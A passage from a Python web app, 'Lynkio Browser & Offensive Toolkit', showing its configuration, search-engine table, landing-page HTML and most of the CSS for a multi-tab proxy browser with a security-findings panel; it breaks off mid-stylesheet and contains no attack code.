#!/usr/bin/env python3
"""
Lynkio Browser & Offensive Toolkit — v14
========================================
Framework: lynkio v1.4.2
"""

import asyncio
import base64
import gzip
import hashlib
import json
import logging
import re
import socket
import ssl as _ssl
import time
import uuid
import zlib
from collections import deque
from urllib.parse import (
    urljoin, urlparse, quote, unquote, parse_qs, urlencode, parse_qsl,
)

from bs4 import BeautifulSoup

from lynkio import (
    Lynk, Request, RawResponse, json_response, framework_version,
)

HOST = "0.0.0.0"
PORT = 8080
FETCH_TIMEOUT = 60.0
MAX_REDIRECTS = 5
MAX_REWRITE_BYTES = 32 * 1024 * 1024
SESSION_COOKIE = "__lynk_sid"
ORIGIN_COOKIE = "__lynk_origin"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("lynk.proxy")


# ======================================================================
# Search engines
# ======================================================================
SEARCH_ENGINES = {
    "google":   ("Google",        "https://www.google.com/search?q={q}"),
    "bing":     ("Bing",          "https://www.bing.com/search?q={q}"),
    "ddg":      ("DuckDuckGo",    "https://duckduckgo.com/html/?q={q}"),
    "brave":    ("Brave",         "https://search.brave.com/search?q={q}"),
    "startpage":("Startpage",     "https://www.startpage.com/sp/search?query={q}"),
    "mojeek":   ("Mojeek",        "https://www.mojeek.com/search?q={q}"),
    "yandex":   ("Yandex",        "https://yandex.com/search/?text={q}"),
    "qwant":    ("Qwant",         "https://www.qwant.com/?q={q}"),
    "ecosia":   ("Ecosia",        "https://www.ecosia.org/search?q={q}"),
    "you":      ("You.com",       "https://you.com/search?q={q}"),
    "searx":    ("SearXNG",       "https://searx.be/search?q={q}"),
    "wikipedia":("Wikipedia",     "https://en.wikipedia.org/w/index.php?search={q}"),
    "github":   ("GitHub",        "https://github.com/search?q={q}"),
    "stackoverflow":("Stack Overflow","https://stackoverflow.com/search?q={q}"),
}

BROWSER_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/124.0.0.0 Safari/537.36"),
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
               "image/avif,image/webp,image/apng,*/*;q=0.8"),
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Cache-Control": "no-cache", "Pragma": "no-cache", "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Priority": "u=0, i",
}

FORWARD_REQUEST_HEADERS = {"authorization","origin","range","if-none-match",
                           "if-modified-since","content-type"}
FORWARD_RESPONSE_HEADERS = {"cache-control","etag","last-modified",
                            "expires","vary","content-language"}

app = Lynk(host=HOST, port=PORT, protocol="TCP", debug=False,
           serve_client=True, max_body_size=64 * 1024 * 1024)


# ======================================================================
# HOME_HTML — the landing page (was missing in v13)
# ======================================================================
HOME_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Lynk · Home</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{--safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
--safe-l:env(safe-area-inset-left,0px);--safe-r:env(safe-area-inset-right,0px)}
*{margin:0;padding:0;box-sizing:border-box}
html,body{min-height:100dvh;background:#070b16;color:#e2e8f0;
font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
-webkit-font-smoothing:antialiased}
body{padding:calc(28px + var(--safe-t)) calc(20px + var(--safe-r)) calc(28px + var(--safe-b)) calc(20px + var(--safe-l));
display:flex;flex-direction:column;align-items:center;gap:26px}
.wrap{width:100%;max-width:780px}
.brand{display:flex;align-items:center;gap:12px;margin-bottom:6px}
.mark{width:42px;height:42px;border-radius:12px;
background:linear-gradient(135deg,#38bdf8,#818cf8);display:grid;place-items:center;
color:#0b1220;font-size:18px;font-weight:800}
h1{font-size:26px;font-weight:800;letter-spacing:-.02em}
.sub{color:#94a3b8;font-size:14px;margin-top:2px}
.ver{display:inline-block;padding:2px 8px;border-radius:6px;font-size:11px;
font-weight:700;background:rgba(56,189,248,.14);color:#38bdf8;
font-family:'JetBrains Mono',monospace;margin-left:8px;vertical-align:middle}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;width:100%}
.card{padding:18px;border-radius:14px;background:#0d1526;
border:1px solid rgba(148,163,184,.14);text-decoration:none;color:inherit;
transition:.15s;display:flex;flex-direction:column;gap:6px}
.card:hover{border-color:rgba(56,189,248,.45);transform:translateY(-2px);
box-shadow:0 20px 40px -20px rgba(56,189,248,.4)}
.card .ic{font-size:22px}
.card .nm{font-weight:700;font-size:14px}
.card .dc{color:#64748b;font-size:12px;line-height:1.5}
form.search{display:flex;gap:6px;align-items:center;background:#0d1526;
border:1px solid rgba(148,163,184,.18);border-radius:12px;
padding:5px 5px 5px 16px;width:100%;flex-wrap:wrap}
form.search input{flex:1;min-width:180px;background:transparent;border:none;
outline:none;color:#e2e8f0;font-family:inherit;font-size:15px;padding:12px 0}
form.search select{background:transparent;border:none;color:#94a3b8;
font-family:inherit;font-size:13px;padding:8px 6px;cursor:pointer}
form.search select option{background:#0d1526;color:#e2e8f0}
form.search button{padding:11px 22px;border-radius:9px;border:none;
background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;
font-weight:700;cursor:pointer;font-family:inherit;font-size:13px}
.kbd{display:inline-block;padding:2px 7px;background:rgba(148,163,184,.12);
border:1px solid rgba(148,163,184,.2);border-radius:5px;
font-family:'JetBrains Mono',monospace;font-size:11px;color:#e2e8f0}
footer{color:#475569;font-size:11.5px;text-align:center;margin-top:auto;
padding-top:20px;font-family:'JetBrains Mono',monospace}
</style></head><body>
<div class="wrap">
  <div class="brand">
    <div class="mark">L</div>
    <div>
      <h1>Lynkio <span class="ver">v__VERSION__</span></h1>
      <div class="sub">Multi-tab browser · offensive toolkit · proxy shell</div>
    </div>
  </div>
</div>

<div class="wrap">
  <form class="search" action="/search" method="get">
    <input name="q" placeholder="Search the web…" autocomplete="off" required>
    <select name="engine">__OPTS__</select>
    <button type="submit">Search</button>
  </form>
</div>

<div class="wrap grid">
  <a class="card" href="/tabs">
    <div class="ic">🗂</div>
    <div class="nm">Multi-tab browser</div>
    <div class="dc">Full tab shell, per-tab history, scraper and toolkit drawer.</div>
  </a>
  <a class="card" href="/proxy?url=https%3A%2F%2Fduckduckgo.com">
    <div class="ic">🛠</div>
    <div class="nm">Open a URL</div>
    <div class="dc">Proxy a single page directly — the toolkit panel loads in every page.</div>
  </a>
  <a class="card" href="/tool/kit.js">
    <div class="ic">📜</div>
    <div class="nm">Kit module</div>
    <div class="dc">The tabs-shell toolkit served at /tool/kit.js.</div>
  </a>
  <a class="card" href="/healthz">
    <div class="ic">📊</div>
    <div class="nm">Health</div>
    <div class="dc">Framework status, active sessions and version.</div>
  </a>
</div>

<div class="wrap" style="color:#94a3b8;font-size:13px;line-height:1.7;text-align:center">
  Press <span class="kbd">Ctrl</span>+<span class="kbd">K</span> to search ·
  <span class="kbd">Ctrl</span>+<span class="kbd">F</span> scraper ·
  <span class="kbd">Ctrl</span>+<span class="kbd">B</span> toolkit
</div>

<footer>lynkio v__VERSION__ · bind 0.0.0.0:8080</footer>
</body></html>
"""


# ======================================================================
# TABS_HTML — responsive multi-tab shell
# ======================================================================
TABS_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,user-scalable=yes">
<title>Lynk · Multi-tab Browser</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
  --safe-t: env(safe-area-inset-top, 0px);
  --safe-b: env(safe-area-inset-bottom, 0px);
  --safe-l: env(safe-area-inset-left, 0px);
  --safe-r: env(safe-area-inset-right, 0px);
  --bg:#070b16;
  --bg-2:#0d1526;
  --line:rgba(148,163,184,.16);
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{
  height:100%;
  font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  background:var(--bg);color:#e2e8f0;overflow:hidden;
  -webkit-font-smoothing:antialiased;overscroll-behavior:none;
}
body{
  display:flex;flex-direction:column;
  height:100vh;
  height:100dvh;
  min-height:0;
}

header{
  display:flex;align-items:center;gap:8px;
  padding:8px 10px;
  padding-top:calc(8px + var(--safe-t));
  padding-left:calc(10px + var(--safe-l));
  padding-right:calc(10px + var(--safe-r));
  background:var(--bg-2);
  border-bottom:1px solid var(--line);
  flex-shrink:0;position:relative;z-index:20;
}
.brand{display:flex;align-items:center;gap:8px;font-weight:800;font-size:14px;
flex-shrink:0;margin-right:4px}
.brand-mark{width:26px;height:26px;border-radius:8px;
background:linear-gradient(135deg,#38bdf8,#818cf8);display:grid;place-items:center;
color:#0b1220;font-size:12px;font-weight:800}

.tabs{display:flex;gap:4px;flex:1;overflow-x:auto;scrollbar-width:none;
padding:2px 0;align-items:center;min-height:36px;-webkit-overflow-scrolling:touch}
.tabs::-webkit-scrollbar{display:none}
.tab{display:flex;align-items:center;gap:6px;padding:0 4px 0 10px;height:32px;
border-radius:9px;background:transparent;color:#94a3b8;cursor:pointer;
font-size:12.5px;font-weight:600;white-space:nowrap;border:1px solid transparent;
max-width:220px;min-width:90px;transition:.12s;position:relative;user-select:none}
.tab:hover{background:rgba(148,163,184,.08);color:#e2e8f0}
.tab.active{background:rgba(56,189,248,.12);color:#38bdf8;border-color:rgba(56,189,248,.3)}
.tab .tab-title{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;line-height:1}
.tab .close{display:flex;align-items:center;justify-content:center;
width:24px;height:24px;flex-shrink:0;border-radius:6px;color:#64748b;
font-size:16px;line-height:1;cursor:pointer;transition:.12s;position:relative}
.tab .close:hover{background:rgba(248,113,113,.18);color:#f87171}
.tab.active .close:hover{background:rgba(248,113,113,.22);color:#fca5a5}
.tab.has-scrape-hits::after{content:'';position:absolute;top:4px;right:4px;
width:6px;height:6px;border-radius:50%;background:#f59e0b}

.newtab-inline{display:flex;align-items:center;justify-content:center;
width:34px;height:34px;flex-shrink:0;border-radius:9px;
border:1px solid rgba(148,163,184,.2);background:transparent;color:#94a3b8;
font-size:18px;line-height:1;cursor:pointer;transition:.12s}
.newtab-inline:hover{background:rgba(56,189,248,.1);border-color:rgba(56,189,248,.4);
color:#38bdf8}

.btn{padding:7px 13px;border-radius:9px;border:1px solid rgba(148,163,184,.2);
background:transparent;color:#e2e8f0;font-family:inherit;font-size:12.5px;
font-weight:600;cursor:pointer;transition:.12s;white-space:nowrap;
display:inline-flex;align-items:center;gap:6px;min-height:34px}
.btn:hover{background:rgba(148,163,184,.08);border-color:rgba(148,163,184,.35)}
.btn.primary{background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220;border:none;
box-shadow:0 8px 18px -8px rgba(56,189,248,.5)}
.btn.primary:hover{filter:brightness(1.08);transform:translateY(-1px)}
.btn.icon{padding:7px 10px}
.btn.danger{border-color:rgba(248,113,113,.35);color:#f87171}
.btn.danger:hover{background:rgba(248,113,113,.1)}
.btn.small{padding:5px 10px;font-size:11.5px;min-height:28px}
.btn:disabled{opacity:.4;cursor:not-allowed}
.btn:active{transform:translateY(1px)}
.btn.primary:active{transform:translateY(0)}

.url-bar{
  display:flex;align-items:center;gap:6px;
  padding:8px 10px;
  padding-left:calc(10px + var(--safe-l));
  padding-right:calc(10px + var(--safe-r));
  background:var(--bg-2);
  border-bottom:1px solid var(--line);
  flex-shrink:0;position:relative;z-index:19;
}
.nav-btn{padding:8px 11px;border-radius:8px;border:1px solid rgba(148,163,184,.2);
background:transparent;color:#e2e8f0;cursor:pointer;font-size:14px;line-height:1;
transition:.12s;min-width:36px;min-height:36px;display:grid;place-items:center}
.nav-btn:hover:not(:disabled){background:rgba(148,163,184,.08)}
.nav-btn:disabled{opacity:.35;cursor:not-allowed}
.url-bar input{flex:1;min-width:0;padding:10px 14px;background:var(--bg);color:#e2e8f0;
border:1px solid rgba(148,163,184,.2);border-radius:10px;
font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12.5px;outline:none;
transition:.15s}
.url-bar input:focus{border-color:rgba(56,189,248,.55);
box-shadow:0 0 0 3px rgba(56,189,248,.12)}

.stack{
  flex:1 1 auto;
  min-height:0;
  position:relative;
  background:#000;
  overflow:hidden;
}
.frame{position:absolute;inset:0;width:100%;height:100%;border:none;display:none;background:#fff}
.frame.active{display:block}
.overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
flex-direction:column;gap:16px;background:var(--bg);color:#94a3b8;font-size:14px;
text-align:center;padding:24px;z-index:5}
.overlay-icon{font-size:56px;opacity:.5}
.overlay-title{font-size:16px;font-weight:600;color:#e2e8f0}
.overlay-hint{font-size:13px;max-width:460px;line-height:1.7}
kbd{display:inline-block;padding:2px 8px;background:rgba(148,163,184,.12);
border:1px solid rgba(148,163,184,.2);border-radius:5px;
font-family:'JetBrains Mono',monospace;font-size:11px;color:#e2e8f0;line-height:1.3}

.drawer{
  position:fixed;background:var(--bg-2);
  border-left:1px solid var(--line);
  top:0;bottom:0;width:min(560px,100vw);z-index:9997;
  display:flex;flex-direction:column;
  box-shadow:-24px 0 60px -20px rgba(0,0,0,.75);
  transition:transform .26s cubic-bezier(.34,1.36,.64,1);
  padding-top:var(--safe-t);
  padding-bottom:var(--safe-b);
}
.drawer.right{right:0;transform:translateX(100%)}
.drawer.right.open{transform:translateX(0)}
.drawer.left{left:0;border-left:none;border-right:1px solid var(--line);
transform:translateX(-100%);box-shadow:24px 0 60px -20px rgba(0,0,0,.75)}
.drawer.left.open{transform:translateX(0)}
.drawer-header{
  display:flex;align-items:center;justify-content:space-between;
  padding:14px 18px;
  border-bottom:1px solid var(--line);
  flex-shrink:0;
  padding-left:calc(18px + var(--safe-l));
  padding-right:calc(18px + var(--safe-r));
  background:linear-gradient(180deg,rgba(56,189,248,.06),transparent);
}
.drawer-title{font-weight:800;font-size:15px;display:flex;align-items:center;gap:10px}
.drawer-title .mark{width:26px;height:26px;border-radius:8px;
background:linear-gradient(135deg,#38bdf8,#818cf8);display:grid;place-items:center;
color:#0b1220;font-size:13px;font-weight:800}
.drawer-body{flex:1;overflow-y:auto;padding:16px 18px;font-size:13px;
-webkit-overflow-scrolling:touch}
.drawer-close{background:rgba(148,163,184,.08);border:none;color:#94a3b8;
width:34px;height:34px;border-radius:9px;font-size:16px;cursor:pointer;
display:grid;place-items:center;transition:.12s}
.drawer-close:hover{background:rgba(248,113,113,.15);color:#f87171}

.scraper-search{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
.scraper-search input{flex:1;min-width:0;padding:11px 14px;background:var(--bg);
color:#e2e8f0;border:1px solid rgba(148,163,184,.2);border-radius:10px;
font-family:inherit;font-size:14px;outline:none;transition:.15s}
.scraper-search input:focus{border-color:rgba(56,189,248,.5);
box-shadow:0 0 0 3px rgba(56,189,248,.1)}
.scraper-filters{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
.scraper-filter{padding:6px 12px;border-radius:20px;
background:rgba(148,163,184,.08);color:#94a3b8;
border:1px solid rgba(148,163,184,.15);cursor:pointer;user-select:none;
font-weight:600;font-size:11.5px;transition:.12s}
.scraper-filter.active{background:rgba(56,189,248,.15);color:#38bdf8;
border-color:rgba(56,189,248,.4)}
.scraper-match{padding:12px;background:var(--bg);border-radius:10px;
margin-bottom:6px;border-left:3px solid #38bdf8}
.scraper-match .meta{display:flex;gap:8px;align-items:center;margin-bottom:6px;
font-size:11px;color:#64748b;font-family:'JetBrains Mono',monospace;flex-wrap:wrap}
.scraper-match .meta .tab-badge{background:rgba(56,189,248,.15);color:#38bdf8;
padding:2px 8px;border-radius:5px;font-weight:600;max-width:180px;
overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.scraper-match .ctx{font-family:'JetBrains Mono',monospace;font-size:12px;
line-height:1.55;color:#e2e8f0;word-break:break-word;
padding:8px 10px;background:rgba(2,6,23,.5);border-radius:7px;margin-bottom:6px}
.scraper-match .ctx mark{background:rgba(56,189,248,.25);color:#38bdf8;
padding:1px 3px;border-radius:3px;font-weight:700}
.scraper-match .ctx mark[contenteditable="true"]{background:rgba(245,158,11,.18);
color:#f59e0b;outline:2px solid #f59e0b}
.scraper-match .actions{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
.scraper-match .actions button{padding:5px 10px;font-size:11px;border-radius:6px;
border:1px solid rgba(148,163,184,.25);background:transparent;color:#e2e8f0;
cursor:pointer;font-family:inherit;font-weight:600;transition:.12s;min-height:28px}

.kit-tabs{display:flex;gap:4px;margin-bottom:14px;
background:rgba(2,6,23,.6);padding:4px;border-radius:11px;
border:1px solid rgba(148,163,184,.1);overflow-x:auto;scrollbar-width:none}
.kit-tabs::-webkit-scrollbar{display:none}
.kit-tab{padding:8px 14px;border-radius:8px;background:transparent;
border:none;color:#94a3b8;font-family:inherit;font-size:12.5px;font-weight:600;
cursor:pointer;white-space:nowrap;transition:.12s;min-height:36px}
.kit-tab.active{background:linear-gradient(135deg,#38bdf8,#818cf8);color:#0b1220}
.kit-tab:not(.active):hover{background:rgba(148,163,184,.08);color:#e2e8f0}
.kit-tab .count{opacity:.7;font-weight:700;margin-left:2px}

.kit-cat{margin-bottom:20px}
.kit-cat-title{font-size:10.5px;font-weight:800;letter-spacing:.14em;
text-transform:uppercase;color:#64748b;margin-bottom:10px;
padding-bottom:6px;border-bottom:1px solid rgba(148,163,184,.1);
display:flex;align-items:center;gap:8px}
.kit-cat-title .count{color:#475569;font-weight:600;letter-spacing:0;text-transform:none}

.kit-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
.kit-tile{padding:12px;border-radius:11px;background:var(--bg);
border:1px solid rgba(148,163,184,.1);cursor:pointer;transition:.15s;
display:flex;flex-direction:column;gap:6px;position:relative;overflow:hidden;
text-align:left;font-family:inherit;color:inherit;min-height:110px}
.kit-tile:hover{border-color:rgba(56,189,248,.4);background:rgba(56,189,248,.06);
transform:translateY(-1px)}
.kit-tile .ti-icon{font-size:20px}
.kit-tile .ti-name{font-weight:700;font-size:12.5px;color:#e2e8f0;line-height:1.3}
.kit-tile .ti-desc{font-size:10.5px;color:#64748b;line-height:1.4}

.tool-form{padding:14px;background:var(--bg);border-radius:12px;
border:1px solid rgba(148,163,184,.1);margin-bottom:14px}
.tool-form-head{display:flex;justify-content:space-between;align-items:flex-start;
margin-bottom:12px;gap:10px;flex-wrap:wrap}
.tool-form-head .title{font-weight:700;font-size:14px}
.tool-form-head .subtitle{font-size:11.5px;color:#64748b;margin-top:2px}
.field{margin-bottom:10px}
.field label{display:block;font-size:11px;color:#94a3b8;font-weight:600;
text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px}
.field input,.field textarea,.field select{
  width:100%;padding:11px 14px;background:#0b1220;color:#e2e8f0;
  border:1px solid rgba(148,163,184,.2);border-radius:9px;
  font-family:'JetBrains Mono',monospace;font-size:13px;outline:none;
  transition:.15s;min-height:42px;-webkit-appearance:none;appearance:none}
.field textarea{min-height:100px;resize:vertical;font-size:12px;line-height:1.5}
.field select{
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10' viewBox='0 0 10 10'><path fill='%2394a3b8' d='M0 3l5 5 5-5z'/></svg>");
  background-repeat:no-repeat;background-position:right 14px center;padding-right:36px;
  font-family:inherit;font-size:13px;cursor:pointer}
.field select option{background:#0b1220;color:#e2e8f0}
.field input:focus,.field textarea:focus,.field select:focus{
  border-color:rgba(56,189,248,.5);box-shadow:0 0 0 3px rgba(56,189,248,.1)}

.tool-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;
padding-top:12px;border-top:1px solid rgba(148,163,184,.1)}
.tool-actions .btn{flex:1;justify-content:center;min-height:42px}
@media(min-width:520px){.tool-actions .btn{flex:0 1 auto;padding:8px 18px}}

.result-pre{padding:12px 14px;background:var(--bg);border-radius:10px;
font-family:'JetBrains Mono',monospace;font-size:11.5px;line-height:1.6;
color:#e2e8f0;overflow:auto;max-height:50vh;white-space:pre-wrap;
word-break:break-word;border:1px solid rgba(148,163,184,.1);
-webkit-overflow-scrolling:touch}
.result-msg{padding:14px;border-radius:10px;font-size:13px;line-height:1.5}
.result-msg.ok{background:rgba(16,185,129,.1);border-left:3px solid #10b981;color:#10b981}
.result-msg.warn{background:rgba(245,158,11,.1);border-left:3px solid #f59e0b;color:#f59e0b}
.result-msg.err{background:rgba(248,113,113,.1);border-left:3px solid #f87171;color:#f87171}
.result-msg.info{background:rgba(56,189,248,.1);border-left:3px solid #38bdf8;color:#38bdf8}

.result-kv{padding:8px 12px;background:var(--bg);border-radius:7px;
margin-bottom:4px;font-family:'JetBrains Mono',monospace;font-size:12px;
display:flex;gap:12px;align-items:flex-start;word-break:break-word}
.result-kv .k{color:#38bdf8;font-weight:600;flex-shrink:0;min-width:80px}
.result-kv .v{color:#e2e8f0;flex:1}

.result-list{padding:6px 0}
.result-list-item{padding:8px 12px;background:var(--bg);border-radius:7px;
margin-bottom:4px;font-family:'JetBrains Mono',monospace;font-size:12px;
display:flex;gap:10px;align-items:center;word-break:break-word}
.result-list-item a{color:#38bdf8;text-decoration:none;flex:1;overflow:hidden;
text-overflow:ellipsis}
.result-list-item .badge{font-size:10px;padding:2px 8px;border-radius:5px;
background:rgba(56,189,248,.12);color:#38bdf8;flex-shrink:0;font-weight:600}

.finding{padding:12px 14px;border-radius:10px;margin-bottom:8px;
background:var(--bg);border-left:3px solid #38bdf8}
.finding.critical{border-left-color:#dc2626;background:rgba(220,38,38,.05)}
.finding.high{border-left-color:#f87171;background:rgba(248,113,113,.05)}
.finding.medium{border-left-color:#f59e0b;background:rgba(245,158,11,.05)}
.finding.low{border-left-color:#38bdf8;background:rgba(56,189,248,.05)}
.finding.info{border-left-color:#64748b}
.finding-head{display:flex;gap:10px;align-items:flex-start;margin-bottom:6px;
flex-wrap:wrap}
.finding-head .sev{font-size:9.5px;font-weight:800;padding:3px 8px;
border-radius:5px;text-transform:uppercase;letter-spacing:.06em;white-space:nowrap}
.finding-head .sev.critical{background:rgba(220,38,38,.2);color:#f87171}
.finding-head .sev.high{background:rgba(248,113,113,.15);color:#f87171}
.finding-head .sev.medium{background:rgba(245,158,11,.15);color:#f59e0b}
.finding-head .sev.low{background:rgba(56,189,248,.15);color:#38bdf8}
.finding-head .sev.info{background:rgba(100,116,139,.2);color:#94a3b8}
.finding-head .title{flex:1;font-weight:700;font-size:13px;line-height:1.35;min-width:0}
.finding-head .cwe{font-family:'JetBrains Mono',monospace;font-size:10px;color:#64748b}
.finding-desc{font-size:12px;color:#94a3b8;line-height:1.55;margin-bottom:8px}
.finding-evidence{padding:8px 10px;background:rgba(2,6,23,.6);border-radius:7px;
font-family:'JetBrains Mono',monospace;font-size:11px;color:#94a3b8;
word-break:break-word;white-space:pre-wrap;margin-bottom:6px;
border:1px solid rgba(148,163,184,.08);max-height:200px;overflow:auto}
.finding-remediation{font-size:11.5px;color:#38bdf8;line-height:1.5;
padding-top:6px;border-top:1px dashed rgba(148,163,184,.15)}
.finding-meta{display:flex;gap:10px;flex-wrap:wrap;font-size:10.5px;
color:#64748b;margin-top:6px;font-family:'JetBrains Mono',monospace}

.report-summary{display:grid;grid-template-columns:repeat(auto-fit,minmax(72px,1fr));
gap:8px;margin-bottom:16px}
.report-stat{padding:12px 8px;border-radius:10px;background:var(--bg);
text-align:center;border:1px solid rgba(148,163,184,.1)}
.report-stat .n{font-size:22px;font-weight:800;line-height:1}
.report-stat .l{font-size:9.5px;text-transform:uppercase;letter-spacing:.08em;
color:#94a3b8;margin-top:3px;font-weight:700}
.report-stat.critical .n{color:#dc2626}
.report-stat.high .n{color:#f87171}
.report-stat.medium .n{color:#f59e0b}
.report-stat.low .n{color:#38bdf8}
.report-stat.info .n{color:#64748b}

.callout{padding:12px 14px;border-radius:10px;font-size:12px;line-height:1.6;
margin-bottom:14px}
.callout.warn{background:rgba(245,158,11,.1);border-left:3px solid #f59e0b;color:#94a3b8}
.callout.info{background:rgba(56,189,248,.08);border-left:3px solid #38bdf8;color:#94a3b8}
.callout b{color:#38bdf8}

.spinner-inline{display:inline-block;width:14px;height:14px;
border:2px solid rgba(148,163,184,.2);border-top-color:#38bdf8;
border-radius:50%;animation:__lynkspin .8s linear infinite;vertical-align:middle}
@keyframes __lynkspin{to{transform:rotate(360deg)}}

.ctx-menu{position:fixed;background:var(--bg-2);border:1px solid rgba(148,163,184,.22);
border-radius:11px;padding:6px;min-width:220px;
box-shadow:0 30px 60px -10px rgba(0,0,0,.8);
z-index:99999;display:none;animation:__lynkfade .12s ease}
.ctx-menu.show{display:block}
.ctx-item{display:flex;align-items:center;gap:10px;padding:11px 12px;
border-radius:7px;color:#e2e8f0;font-size:13.5px;font-weight:500;
cursor:pointer;transition:.1s;user-select:none}
.ctx-item:hover{background:rgba(56,189,248,.12);color:#38bdf8}
.ctx-item.danger:hover{background:rgba(248,113,113,.15);color:#f87171}
.ctx-item.disabled{opacity:.4;cursor:not-allowed;pointer-events:none}
.ctx-item .k{flex:1}
.ctx-item .shortcut{color:#64748b;font-family:'JetBrains Mono',monospace;font-size:11px}
.ctx-sep{height:1px;background:rgba(148,163,184,.14);margin:5px 4px}

.search-modal{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:9999;
display:none;align-items:flex-start;justify-content:center;
padding:calc(80px + var(--safe-t)) 16px 16px;
-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px)}
.search-modal.show{display:flex;animation:__lynkfade .18s ease}
.search-modal .box{background:var(--bg-2);border:1px solid rgba(148,163,184,.2);
border-radius:16px;padding:20px;width:100%;max-width:680px;
box-shadow:0 40px 80px -20px rgba(0,0,0,.8)}
.search-modal .label{font-size:11px;color:#94a3b8;letter-spacing:.14em;
text-transform:uppercase;font-weight:700;margin-bottom:10px}
.search-modal form{display:flex;gap:6px;align-items:center;background:var(--bg);
border:1px solid rgba(148,163,184,.2);border-radius:12px;padding:4px 4px 4px 14px;
flex-wrap:wrap}
.search-modal input{flex:1;min-width:160px;background:transparent;border:none;
outline:none;color:#e2e8f0;font-family:inherit;font-size:15px;padding:12px 0}
.search-modal select{background:transparent;border:none;color:#94a3b8;
font-family:inherit;font-size:13px;padding:8px 6px;cursor:pointer}
.search-modal select option{background:var(--bg-2);color:#e2e8f0}

.toast{position:fixed;bottom:calc(24px + var(--safe-b));left:50%;
transform:translateX(-50%) translateY(80px);
background:var(--bg-2);border:1px solid rgba(148,163,184,.22);
color:#e2e8f0;padding:12px 20px;border-radius:11px;
font-size:13px;font-weight:600;box-shadow:0 20px 40px -12px rgba(0,0,0,.7);
z-index:99998;opacity:0;
transition:transform .24s cubic-bezier(.34,1.36,.64,1),opacity .2s;
pointer-events:none;display:flex;align-items:center;gap:10px;
max-width:90vw}
.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
.toast .undo{color:#38bdf8;cursor:pointer;font-weight:700;
text-decoration:underline;margin-left:6px;pointer-events:auto}

@keyframes __lynkfade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

@media (hover:none){
  .tab .close{width:28px;height:28px;font-size:18px}
  .nav-btn{min-width:40px;min-height:40px}
  .btn{min-height:38px}
}
@media(max-width:820px){
  .brand span{display:none}
  .btn-label{display:none}
  .kit-grid{grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:6px}
  .kit-tile{padding:10px;min-height:96px}
  .kit-tile .ti-icon{font-size:18px}
  .kit-tile .ti-name{font-size:11.5px}
  .kit-tile .ti-desc{display:none}
}
@media (min-width:821px) and (max-width:1100px){
  .kit-grid{grid-template-columns:repeat(auto-fill,minmax(170px,1fr))}
}
@media(max-width:520px){
  header{padding:6px 8px;gap:6px;
    padding-left:calc(8px + var(--safe-l));
    padding-right:calc(8px + var(--safe-r));}
  .tab{max-width:130px;min-width:70px;padding:0 3px 0 8px;font-size:11.5px;height:30px}
  .tab .close{width:22px;height:22px;font-size:14px}
  .url-bar{padding:6px 8px;gap:4px;
    padding-left:calc(8px + var(--safe-l));
    padding-right:calc(8px + var(--safe-r));}
  .nav-btn{padding:6px 8px;min-width:32px;min-height:32px;font-size:13px}
  .url-bar input{padding:9px 11px;font-size:12px}
  .btn{padding:6px 10px;font-size:11.5px;min-height:32px}
  .drawer{width:100vw;border-radius:0}
  .drawer-body{padding:12px}
  .scraper-match{padding:10px}
  .scraper-match .actions button{padding:6px 9px;font-size:10.5px}
  .kit-tabs{gap:2px;padding:3px}
  .kit-tab{padding:7px 11px;font-size:11.5px}
  .finding{padding:10px 12px}
  .finding-head .title{font-size:12.5px}
  .tool-actions .btn{flex:1;padding:10px 12px;font-size:12.5px}
}
@media (max-width:420px){
  .brand{display:none}
  .tab{max-width:110px;min-width:60px}
